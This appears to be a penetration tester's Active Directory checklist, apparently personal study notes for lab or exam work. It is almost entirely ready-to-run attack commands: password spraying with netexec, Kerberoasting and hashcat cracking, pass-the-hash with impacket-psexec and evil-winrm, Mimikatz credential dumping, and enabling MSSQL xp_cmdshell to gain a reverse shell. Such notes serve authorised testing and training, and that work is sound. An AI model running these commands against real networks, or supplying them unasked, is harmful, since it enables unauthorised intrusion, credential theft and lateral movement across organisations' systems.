# Active Directory Domain Enumeration Checklist

**Use this checklist when you get NEW credentials or find a NEW password.**
Test everything systematically with NetExec to avoid missing access.

## Whenever You Get New Credentials (ALWAYS RUN THIS)

### Test Credential Validity Across Protocols
- SMB
- WinRM
- LDAP
- MSSQL
- RDP

### Spray Credentials Across All Domain Hosts

**DO NOT SKIP: Test on ALL domain machines, not just DC**

- [ ] Test SMB on all hosts: `netexec smb <targets> -u <user> -p '<password>' --shares`
- [ ] Test WinRM on all hosts: `netexec winrm <targets> -u <user> -p '<password>'`
- [ ] **If local admin password found:** Test with `--local-auth`: `netexec smb <targets> -u Administrator -p '<password>' --local-auth`
- [ ] Check for share access: Review `--shares` output for readable shares beyond IPC$

### Enumerate with Valid Credentials

- [ ] Get domain password policy: `netexec smb <DC-IP> -u <user> -p '<password>' --pass-pol`
- [ ] Enumerate domain users: `netexec smb <DC-IP> -u <user> -p '<password>' --users`
- [ ] Enumerate domain groups: `netexec smb <DC-IP> -u <user> -p '<password>' --groups`
- [ ] Check user privileges: `netexec smb <targets> -u <user> -p '<password>' --local-groups`

## Kerberoasting (HIGH PRIORITY - Always Try)

- [ ] Find SPN users from Linux: `impacket-GetUserSPNs <domain>/<user>:<password> -dc-ip <DC-IP> -request`
- [ ] Save hashes: `impacket-GetUserSPNs <domain>/<user>:<password> -dc-ip <DC-IP> -request -outputfile kerberoast.hash`
- [ ] Crack immediately: `hashcat -m 13100 kerberoast.hash /usr/share/wordlists/rockyou.txt`
- [ ] If cracked, **GO BACK TO TOP** and test new credentials

## BloodHound Collection (CRITICAL - Don't Skip)

- [ ] [[Active Directory#Run SharpHound|Run SharpHound]]
- [ ] Upload to BloodHound and analyze
- [ ] Check "Shortest Path to Domain Admins" from owned user
- [ ] Mark compromised users as "Owned" in BloodHound

## Hash-Based Authentication (If You Have NTLM Hash)

- [ ] Test hash via SMB: `netexec smb <targets> -u <user> -H <hash>`
- [ ] Test hash via WinRM: `netexec winrm <targets> -u <user> -H <hash>`
- [ ] Pass-the-hash with Impacket: `impacket-psexec <domain>/<user>@<target> -hashes :<hash>`
- [ ] Pass-the-hash via evil-winrm: `evil-winrm -i <target> -u <user> -H <hash>`

## After Getting WinRM/RDP Access to New Machine

**Use [[CHECKLIST-Post-Exploitation]] for the host**

Then continue domain enumeration:

- [ ] Check if machine has multiple NICs: `ipconfig /all` (pivot needed?)
- [ ] [[Active Directory#Run SharpHound|Run SharpHound]]
- [ ] Dump credentials with Mimikatz: [[Windows Privilege Escalation#Mimikatz logonpasswords|Mimikatz logonpasswords]]
- [ ] **For each new credential found, GO BACK TO TOP** and test across domain

## MSSQL Access (If netexec Shows MSSQL Access)

- [ ] Connect to MSSQL: `impacket-mssqlclient <domain>/<user>:<password>@<target>`
- [ ] Check if xp_cmdshell enabled: `EXEC sp_configure 'xp_cmdshell'`
- [ ] Try to enable xp_cmdshell: `EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;`
- [ ] Execute commands: `xp_cmdshell 'whoami'`
- [ ] Get reverse shell if xp_cmdshell works

## Common Pitfalls

**If stuck, did you:**
- Test new credentials on ALL hosts (not just DC)?
- Try `--local-auth` flag for local admin passwords?
- Run Kerberoast and start cracking in background?
- Collect BloodHound data and actually analyze it?
- Check PowerShell history on EVERY machine you access?
- Test passwords found in history across all machines?

## Reference

For detailed AD methodology, see [[Active Directory]]
